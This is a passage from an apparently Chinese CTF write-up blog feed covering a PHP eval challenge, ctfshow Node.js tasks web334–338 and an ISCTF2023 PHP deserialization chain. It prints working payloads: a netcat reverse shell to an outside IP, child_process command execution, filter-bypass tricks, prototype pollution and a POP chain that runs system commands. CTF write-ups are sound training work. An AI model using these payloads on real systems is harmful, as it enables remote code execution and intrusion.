class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/echo|exec|eval|system|fputs|\.|\/|\\|/i&quot;</span>, <span class="hljs-variable">$cmd</span>)) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;肘死你&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$_GET</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$val_name</span> =&gt; <span class="hljs-variable">$val_val</span>) &#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/bin|mv|cp|ls|\||f|a|l|\?|\*|\&gt;/i&quot;</span>, <span class="hljs-variable">$val_val</span>)) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;what can i say&quot;</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$cmd</span>;<br>&#125;<br><br><span class="hljs-variable">$cmd</span> = <span class="hljs-title function_ invoke__">Kobe</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;#man,&quot;</span> . <span class="hljs-variable">$cmd</span>  . <span class="hljs-string">&quot;,manba out&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br><span class="hljs-keyword">eval</span>(<span class="hljs-string">&quot;#man,&quot;</span> . <span class="hljs-variable">$cmd</span> . <span class="hljs-string">&quot;,mamba out&quot;</span>);<br></code></pre></td></tr></table></figure><p>存在长度限制<code>strlen($cmd) &gt; 13</code>，使用反引号执行命令</p><p>等价shell_exec()，无回显</p><p>构造</p><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey">`$_GET[<span class="hljs-number">1</span>]`;<br></code></pre></td></tr></table></figure><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs autoit"><span class="hljs-built_in">eval</span>(<span class="hljs-string">&quot;#man,&quot;</span> . $cmd . <span class="hljs-string">&quot;,mamba out&quot;</span>)<span class="hljs-comment">;</span><br>%<span class="hljs-number">0</span>a换行符绕过<span class="hljs-string">&quot;#man,&quot;</span><br><span class="hljs-meta">#注释掉<span class="hljs-string">&quot;,mamba out&quot;</span></span><br></code></pre></td></tr></table></figure><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mel">?cmd=%0a<span class="hljs-string">`$_GET[1]`</span>;%23<br></code></pre></td></tr></table></figure><p>考虑反弹shell</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile">?<span class="hljs-keyword">cmd</span><span class="language-bash">=%0a`<span class="hljs-variable">$_GET</span>[1]`;%23&amp;1=nc 120.76.142.165 32771 -e /bi<span class="hljs-string">&#x27;&#x27;</span>n/sh</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Englobe/picture/main/202404292148809.png" alt="image-20240429214826700"></p><p>方法2：</p><p>cp外带到网站根目录进行读取，过滤字符通过正则匹配绕过</p><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mel">?cmd=%0A<span class="hljs-string">`$_GET[1]`</span>;%23&amp;<span class="hljs-number">1</span>=c<span class="hljs-string">&#x27;&#x27;</span>p/[@-z][@-z][@-z][@-z]/v[@-z]r/www/htm[@-z]<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>比赛</category>
      
    </categories>
    
    
    <tags>
      
      <tag>比赛</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ctfshow node.js</title>
    <link href="/2024/03/08/%E5%88%B7%E9%A2%98/ctfshow-node-js/"/>
    <url>/2024/03/08/%E5%88%B7%E9%A2%98/ctfshow-node-js/</url>
    
    <content type="html"><![CDATA[<h3 id="web334"><a href="#web334" class="headerlink" title="web334"></a>web334</h3><p>下载附件后解压</p><p>有两个文件：login.js user.js</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-comment">//login.js</span><br><span class="hljs-keyword">var</span> findUser = <span class="hljs-keyword">function</span>(<span class="hljs-params">name, password</span>)&#123;<br><span class="hljs-keyword">return</span> users.<span class="hljs-title function_">find</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params">item</span>)&#123;<br><span class="hljs-keyword">return</span> name!==<span class="hljs-string">&#x27;CTFSHOW&#x27;</span> &amp;&amp; item.<span class="hljs-property">username</span> === name.<span class="hljs-title function_">toUpperCase</span>() &amp;&amp; item.<span class="hljs-property">password</span> === password;<br>&#125;);<br>&#125;;<br></code></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-comment">//user.js</span><br><span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = &#123;<br><span class="hljs-attr">items</span>: [<br>&#123;<span class="hljs-attr">username</span>: <span class="hljs-string">&#x27;CTFSHOW&#x27;</span>, <span class="hljs-attr">password</span>: <span class="hljs-string">&#x27;123456&#x27;</span>&#125;<br>]<br>&#125;;<br></code></pre></td></tr></table></figure><p>name不能为CTFSHOW</p><p>但是登录需要usename为CTFSHOW，password为123456</p><p>toUpperCase()可以将小写转换成大写。</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">toUpperCase</span><span class="hljs-params">()</span></span> 函数，字符 ı 会转变为 I ，字符 ſ 会变为 S 。<br><span class="hljs-function"><span class="hljs-title">toLowerCase</span><span class="hljs-params">()</span></span> 函数中，字符 İ 会转变为 <span class="hljs-selector-tag">i</span> ，字符 K 会转变为 k 。<br></code></pre></td></tr></table></figure><p>用username&#x3D;ctfshow和password&#x3D;123456绕过</p><h3 id="web335"><a href="#web335" class="headerlink" title="web335"></a>web335</h3><p>源码发现</p><p><img src="https://i0.imgs.ovh/2024/03/07/QUGzO.png" alt="image-20240308205948224"></p><p>尝试eval&#x3D;ls结果404找不到文件</p><p>测试eval&#x3D;1输出1</p><figure class="highlight qml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs qml">在nodejs中，<span class="hljs-built_in">eval</span>()方法用于计算字符串，并把它作为脚本代码来执行，语法为“<span class="hljs-built_in">eval</span>(<span class="hljs-built_in">string</span>)”；如果参数不是字符串，而是整数或者是<span class="hljs-built_in">Function</span>类型，则直接返回该整数或<span class="hljs-built_in">Function</span>。<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">Node.js中的child_process.exec调用的是/bash.sh，它是一个bash解释器，可以执行系统命令。<br>在<span class="hljs-built_in">eval</span>函数的参数中可以构造require(<span class="hljs-string">&#x27;child_process&#x27;</span>).<span class="hljs-built_in">exec</span>(<span class="hljs-string">&#x27;&#x27;</span>);来进行调用。<br></code></pre></td></tr></table></figure><p>构建<img src="https://i0.imgs.ovh/2024/03/07/QUaCH.png" alt="image-20240308210842812"></p><p>返回 [object Object]</p><p><a href="https://nodejs.cn/api/child_process.html">https://nodejs.cn/api/child_process.html</a></p><p><img src="https://i0.imgs.ovh/2024/03/07/QUvmD.png" alt="image-20240308210942024"></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs javascript">法一：系统命令<br>?<span class="hljs-built_in">eval</span>=<span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;child_process&#x27;</span>).<span class="hljs-title function_">execSync</span>(<span class="hljs-string">&#x27;ls&#x27;</span>)<br>?<span class="hljs-built_in">eval</span>=<span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;child_process&#x27;</span>).<span class="hljs-title function_">spawnSync</span>(<span class="hljs-string">&#x27;ls&#x27;</span>).<span class="hljs-property">output</span><br>?<span class="hljs-built_in">eval</span>=<span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;child_process&#x27;</span>).<span class="hljs-title function_">spawnSync</span>(<span class="hljs-string">&#x27;cat&#x27;</span>,[<span class="hljs-string">&#x27;fl00g.txt&#x27;</span>]).<span class="hljs-property">stdout</span><br>?<span class="hljs-built_in">eval</span>=<span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;child_process&#x27;</span>).<span class="hljs-title function_">execFileSync</span>(<span class="hljs-string">&#x27;ls&#x27;</span>)<br>?<span class="hljs-built_in">eval</span>=<span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;child_process&#x27;</span>).<span class="hljs-title function_">execFileSync</span>(<span class="hljs-string">&#x27;ls&#x27;</span>,[<span class="hljs-string">&#x27;-a&#x27;</span>])<br><span class="hljs-comment">//execFileSync只能执行ls之类，cat不了文件</span><br><br>法二：文件操作<br>?<span class="hljs-built_in">eval</span>=<span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;fs&#x27;</span>).<span class="hljs-title function_">readdirSync</span>(<span class="hljs-string">&#x27;.&#x27;</span>)<br>?<span class="hljs-built_in">eval</span>=<span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;fs&#x27;</span>).<span class="hljs-title function_">readFileSync</span>(<span class="hljs-string">&#x27;fl00g.txt&#x27;</span>)<br></code></pre></td></tr></table></figure><p><img src="https://i0.imgs.ovh/2024/03/07/QUyco.png" alt="image-20240308211731102"></p><p>发现fl00g.txt，直接cat</p><h3 id="web336"><a href="#web336" class="headerlink" title="web336"></a>web336</h3><p>法一</p><p>exec被屏蔽，利用其它函数绕过</p><figure class="highlight coffeescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs coffeescript">?<span class="hljs-built_in">eval</span>=<span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;child_process&#x27;</span>).spawnSync(<span class="hljs-string">&#x27;ls&#x27;</span>).output<br>?<span class="hljs-built_in">eval</span>=<span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;child_process&#x27;</span>).spawnSync(<span class="hljs-string">&#x27;cat&#x27;</span>,[<span class="hljs-string">&#x27;fl001g.txt&#x27;</span>]).output<br><br>?<span class="hljs-built_in">eval</span>=<span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;fs&#x27;</span>).readdirSync(<span class="hljs-string">&#x27;.&#x27;</span>)<br>?<span class="hljs-built_in">eval</span>=<span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;fs&#x27;</span>).readFileSync(<span class="hljs-string">&#x27;fl001g.txt&#x27;</span>)<br></code></pre></td></tr></table></figure><p>法二</p><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sqf"><span class="hljs-variable">__filename</span> 表示当前正在执行的脚本的文件名。它将输出文件所在位置的绝对路径，且和命令行参数所指定的文件名不一定相同。 如果在模块中，返回的值是模块文件的路径。 <span class="hljs-variable">__dirname</span> 表示当前执行脚本所在的目录。<br></code></pre></td></tr></table></figure><p>传?eval&#x3D;__filename可以看到路径为&#x2F;app&#x2F;routes&#x2F;index.js</p><p>然后传eval&#x3D;require(‘fs’).readFileSync(‘&#x2F;app&#x2F;routes&#x2F;index.js’,’utf-8’)可以发现过滤了exec和load</p><p>用%2B代替+绕过</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">require</span><span class="hljs-params">(<span class="hljs-string">&quot;child_process&quot;</span>)</span></span><span class="hljs-selector-attr">[<span class="hljs-string">&#x27;exe&#x27;</span>%2B<span class="hljs-string">&#x27;cSync&#x27;</span>]</span>(<span class="hljs-string">&#x27;ls&#x27;</span>)<br></code></pre></td></tr></table></figure><h3 id="web337"><a href="#web337" class="headerlink" title="web337"></a>web337</h3><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs arcade"><span class="hljs-keyword">var</span> express = require(<span class="hljs-string">&#x27;express&#x27;</span>);<br><span class="hljs-keyword">var</span> router = express.Router();<br><span class="hljs-keyword">var</span> crypto = require(<span class="hljs-string">&#x27;crypto&#x27;</span>);<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">md5</span>(<span class="hljs-params">s</span>) &#123;<br>  <span class="hljs-keyword">return</span> crypto.createHash(<span class="hljs-string">&#x27;md5&#x27;</span>)<br>    .update(s)<br>    .digest(<span class="hljs-string">&#x27;hex&#x27;</span>);<br>&#125;<br><br><span class="hljs-comment">/* GET home page. */</span><br>router.get(<span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-keyword">function</span>(<span class="hljs-params">req, res, next</span>) &#123;<br>  res.type(<span class="hljs-string">&#x27;html&#x27;</span>);<br>  <span class="hljs-keyword">var</span> flag=<span class="hljs-string">&#x27;xxxxxxx&#x27;</span>;<br>  <span class="hljs-keyword">var</span> a = req.query.a;<br>  <span class="hljs-keyword">var</span> b = req.query.b;<br>  <span class="hljs-keyword">if</span>(a &amp;&amp; b &amp;&amp; a.<span class="hljs-built_in">length</span>===b.<span class="hljs-built_in">length</span> &amp;&amp; a!==b &amp;&amp; md5(a+flag)===md5(b+flag))&#123;<br>  res.end(flag);<br>  &#125;<span class="hljs-keyword">else</span>&#123;<br>  res.render(<span class="hljs-string">&#x27;index&#x27;</span>,&#123; <span class="hljs-attr">msg</span>: <span class="hljs-string">&#x27;tql&#x27;</span>&#125;);<br>  &#125;<br><br>&#125;);<br><br>module.exports = router;<br></code></pre></td></tr></table></figure><p>判断存在a,b，a的长度等于b的长度，a不等于b（弱类型判断），md5加密a+flag和加密b+flag相等（强类型判断）</p><p>构造数组绕过</p><figure class="highlight inform7"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs inform7">?a<span class="hljs-comment">[]</span>=1&amp;b<span class="hljs-comment">[]</span>=1<br>?a<span class="hljs-comment">[]</span>=1&amp;b=1<br></code></pre></td></tr></table></figure><h3 id="web338"><a href="#web338" class="headerlink" title="web338"></a>web338</h3><p>login.js:</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">var</span> express = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;express&#x27;</span>);<br><span class="hljs-keyword">var</span> router = express.<span class="hljs-title class_">Router</span>();<br><span class="hljs-keyword">var</span> utils = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;../utils/common&#x27;</span>);<br><span class="hljs-comment">/* GET home page. */</span><br>router.<span class="hljs-title function_">post</span>(<span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;body-parser&#x27;</span>).<span class="hljs-title function_">json</span>(),<span class="hljs-keyword">function</span>(<span class="hljs-params">req, res, next</span>) &#123;<br>res.<span class="hljs-title function_">type</span>(<span class="hljs-string">&#x27;html&#x27;</span>);<br><span class="hljs-keyword">var</span> flag=<span class="hljs-string">&#x27;flag_here&#x27;</span>;<br><span class="hljs-keyword">var</span> secert = &#123;&#125;;<br><span class="hljs-keyword">var</span> sess = req.<span class="hljs-property">session</span>;<br><span class="hljs-keyword">let</span> user = &#123;&#125;;<br>utils.<span class="hljs-title function_">copy</span>(user,req.<span class="hljs-property">body</span>);<br><span class="hljs-keyword">if</span>(secert.<span class="hljs-property">ctfshow</span>===<span class="hljs-string">&#x27;36dboy&#x27;</span>)&#123;<br>res.<span class="hljs-title function_">end</span>(flag);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br><span class="hljs-keyword">return</span> res.<span class="hljs-title function_">json</span>(&#123;<span class="hljs-attr">ret_code</span>: <span class="hljs-number">2</span>, <span class="hljs-attr">ret_msg</span>: <span class="hljs-string">&#x27;登录失败&#x27;</span>+<span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(user)&#125;);<br>&#125;<br>&#125;);<br><span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = router;<br></code></pre></td></tr></table></figure><p>不难看出让<code>secert.ctfshow===&#39;36dboy&#39;</code>即可获取flag</p><p>利用函数<code>copy</code>，这是一个递归调用函数，for循环遍历object2当中的key(键)，如果这个键在object1与object2当中都存在，则调用<code>copy(object1[key], object2[key])</code>,否则让<code>object1[key] = object2[key]</code></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">copy</span>(<span class="hljs-params">object1, object2</span>)&#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> key <span class="hljs-keyword">in</span> object2) &#123;<br>        <span class="hljs-keyword">if</span> (key <span class="hljs-keyword">in</span> object2 &amp;&amp; key <span class="hljs-keyword">in</span> object1) &#123;<br>            <span class="hljs-title function_">copy</span>(object1[key], object2[key])<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            object1[key] = object2[key]<br>        &#125;<br>    &#125;<br>  &#125;<br></code></pre></td></tr></table></figure><p>原型链污染<a href="https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html#0x02-javascript">https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html#0x02-javascript</a></p><p>通过操作user变量，达到原型链污染</p><p>payload：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;__proto__&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;ctfshow&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;36dboy&quot;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>让<code>object2</code>为<code>&#123;&quot;__proto__&quot;:&#123;&quot;ctfshow&quot;:&quot;36dboy&quot;&#125;&#125;</code>会发生什么（注意本题当中object1为secret变量）</p><p>由于<code>object1和object2</code>的对象都具有属性<code>__proto__</code>,进入if语句为true，执行</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">copy</span><span class="hljs-params">(object1[__proto__], object2[__proto__])</span></span><br></code></pre></td></tr></table></figure><p>此时<code>let key in object2</code>的<code>key</code>为<code>ctfshow</code>很明显object1当中没有，所以进入else部分</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs prolog">object1[ctfshow] = object2[ctfshow]<span class="hljs-string">`，成功赋值为`</span><span class="hljs-number">36</span>dboy<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>刷题</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctfshow</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ISCTF2023</title>
    <link href="/2023/12/01/%E6%AF%94%E8%B5%9B/ISCTF2023/"/>
    <url>/2023/12/01/%E6%AF%94%E8%B5%9B/ISCTF2023/</url>
    
    <content type="html"><![CDATA[<h2 id="圣杯战争！！！"><a href="#圣杯战争！！！" class="headerlink" title="圣杯战争！！！"></a>圣杯战争！！！</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">artifact</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$excalibuer</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$arrow</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;为Saber选择了对的武器!&lt;br&gt;&quot;</span>;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;excalibuer-&gt;arrow;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">prepare</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$release</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$key</span></span>)</span>&#123;<br>        <span class="hljs-variable">$functioin</span> = <span class="hljs-variable language_">$this</span>-&gt;release;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;蓄力!咖喱棒！！&lt;br&gt;&quot;</span>;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$functioin</span>();<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">saber</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$weapon</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;胜利！&lt;br&gt;&quot;</span>;<br>        <span class="hljs-keyword">include</span>(<span class="hljs-variable language_">$this</span>-&gt;weapon);<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">summon</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$Saber</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$Rider</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;开始召唤从者！&lt;br&gt;&quot;</span>;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;Saber;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;payload&#x27;</span>]))&#123;<br>    <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;payload&#x27;</span>]);<br>&#125;<br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><p>反序列化</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs scss"><span class="hljs-built_in">__tostring</span>() 表达方式错误导致魔术方法触发（把对象当成字符串调用）<br><br><span class="hljs-built_in">__get</span>() 调用的成员属性是私有属性或不存在时触发（返回值：不存在的成员属性的名称）<br><br><span class="hljs-built_in">__invoke</span>() 格式表达错误导致没魔术方法触发（把对象当成函数调用）<br><br><span class="hljs-built_in">__wakeup</span>() <span class="hljs-built_in">unserialize</span>()之前会检查是否存在一个<span class="hljs-built_in">__wakeup</span>()方法，如果存在，则会先调用<span class="hljs-built_in">__wakeup</span>()方法<br></code></pre></td></tr></table></figure><p>链子：<code>__wakeup() -&gt; __tostring() -&gt; __get() -&gt; ____invoke()</code></p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-variable">$a</span>=new saber();<br><span class="hljs-variable">$a</span>-&gt;<span class="hljs-attribute">weapon</span>=<span class="hljs-string">&quot;data://text/plain,&lt;?php echo system(&#x27;cat /fl*&#x27;);?&gt;&quot;</span>;<br><span class="hljs-variable">$b</span>=new prepare();<br><span class="hljs-variable">$b</span>-&gt;<span class="hljs-attribute">release</span>=<span class="hljs-variable">$a</span>;<br><span class="hljs-variable">$c</span>=new artifact();<br><span class="hljs-variable">$c</span>-&gt;<span class="hljs-attribute">excalibuer</span>=<span class="hljs-variable">$b</span>;<br><span class="hljs-variable">$c</span>-&gt;<span class="hljs-attribute">arrow</span>=<span class="hljs-string">&quot;asd&quot;</span>;<br><span class="hljs-variable">$d</span>=new summon();<br><span class="hljs-variable">$d</span>-&gt;<span class="hljs-attribute">Saber</span>=<span class="hljs-variable">$c</span>;<br>echo serialize(<span class="hljs-variable">$d</span>);<br></code></pre></td></tr></table></figure><p>payload:</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">O</span>:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;summon&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;Saber&quot;</span>;O:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;artifact&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">10</span>:<span class="hljs-string">&quot;excalibuer&quot;</span>;O:<span class="hljs-number">7</span>:<span class="hljs-string">&quot;prepare&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">7</span>:<span class="hljs-string">&quot;release&quot;</span>;O:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;saber&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;weapon&quot;</span>;s:<span class="hljs-number">50</span>:<span class="hljs-string">&quot;data://text/plain,&quot;</span>;&#125;&#125;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;arrow&quot;</span>;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;asd&quot;</span>;&#125;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;Rider&quot;</span>;N;&#125;<br></code></pre></td></tr></table></figure><h2 id="where-is-the-flag"><a href="#where-is-the-flag" class="headerlink" title="where_is_the_flag"></a>where_is_the_flag</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span 